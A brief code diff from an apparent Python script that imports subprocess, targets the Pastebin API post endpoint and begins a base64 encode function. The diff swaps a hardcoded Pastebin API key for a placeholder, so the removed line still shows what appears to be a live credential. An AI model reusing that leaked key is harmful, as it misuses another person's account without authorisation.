@@ -6,7 +6,7 @@ from subprocess import PIPE, Popen
 from requests.api import post
 
 url = 'https://pastebin.com/api/api_post.php'
-key = "JeoHmizwZfczJa8MtGfyrOjMJjyoFufS"
+key = " [PLEASE INPUT YOUR OWN API KEY] "
 
 def encode(message):
     # Encode to base64
